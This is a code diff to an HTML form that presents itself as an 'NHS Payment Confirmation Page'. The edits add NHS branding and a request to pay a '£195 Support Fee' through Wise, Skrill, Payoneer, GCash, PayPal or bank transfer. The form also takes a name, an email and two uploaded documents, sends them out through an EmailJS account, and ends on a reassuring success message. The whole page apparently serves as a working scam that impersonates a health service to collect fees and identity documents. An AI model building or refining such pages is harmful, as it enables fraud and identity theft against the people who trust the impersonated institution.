@@ -1,3 +1,4 @@
+<!-- NHS Payment Confirmation Page -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -8,49 +9,65 @@
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
-      background: #f4f4f4;
-      padding: 0;
+      background-color: #ffffff;
       margin: 0;
+      padding: 0;
+      color: #333;
     }
     .container {
       max-width: 600px;
       margin: 40px auto;
-      background: white;
       padding: 30px;
-      border-radius: 8px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      background: #f9f9f9;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
     }
     h1 {
       text-align: center;
-      color: #011a44;
+      color: #005EB8;
+      font-size: 28px;
+      margin-bottom: 30px;
     }
     label {
       display: block;
       margin-top: 15px;
       font-weight: 600;
+      font-size: 15px;
     }
     input, select {
       width: 100%;
-      padding: 10px;
-      margin-top: 5px;
+      padding: 12px;
+      margin-top: 6px;
       border: 1px solid #ccc;
-      border-radius: 5px;
+      border-radius: 6px;
+      font-size: 14px;
     }
     .button {
       background: #005EB8;
-      color: white;
-      padding: 12px;
-      margin-top: 20px;
+      color: #fff;
+      padding: 14px;
+      margin-top: 25px;
       border: none;
-      border-radius: 5px;
+      border-radius: 6px;
       cursor: pointer;
       width: 100%;
+      font-size: 16px;
       font-weight: bold;
+      transition: background 0.3s ease;
+    }
+    .button:hover {
+      background: #004080;
     }
     .logo {
       display: block;
-      margin: 0 auto 20px;
+      margin: 0 auto 25px;
       height: 60px;
+    }
+    .success-message {
+      text-align: center;
+      font-size: 18px;
+      color: #2e7d32;
+      font-weight: 600;
     }
   </style>
 </head>
@@ -65,10 +82,14 @@
       <label for="email">Email Address</label>
       <input type="email" id="email" name="email" required />
 
-      <label for="payment_method">Select Payment Method</label>
+      <label for="payment_method">Select Payment Method to Pay £195 Support Fee</label>
       <select id="payment_method" name="payment_method" required>
         <option value="">Choose one</option>
         <option value="PayPal">PayPal</option>
+        <option value="Wise (formerly TransferWise)">Wise (formerly TransferWise)</option>
+        <option value="Skrill">Skrill</option>
+        <option value="Payoneer">Payoneer</option>
+        <option value="GCash (Philippines)">GCash (Philippines)</option>
         <option value="Bank Transfer">Bank Transfer</option>
       </select>
 
@@ -80,6 +101,9 @@
 
       <button type="submit" class="button">Submit Documents & Confirm</button>
     </form>
+    <div id="successMessage" class="success-message" style="display: none;">
+      Thank you. Your submission has been received.
+    </div>
   </div>
 
   <script>
@@ -90,10 +114,13 @@
     document.getElementById("confirmForm").addEventListener("submit", async function (e) {
       e.preventDefault();
       const form = e.target;
+      const submitButton = form.querySelector(".button");
+      submitButton.disabled = true;
+      submitButton.textContent = "Submitting...";
+
       const name = form.name.value;
       const email = form.email.value;
       const method = form.payment_method.value;
-
       const uploads = [];
       const files = [form.document1.files[0], form.document2.files[0]];
 
@@ -118,8 +145,9 @@
       };
 
       await emailjs.send("service_le7bi2e", "template_cklte59", templateParams);
-      alert("Thank you. Your submission has been received.");
-      form.reset();
+
+      form.style.display = "none";
+      document.getElementById("successMessage").style.display = "block";
     });
   </script>
 </body>
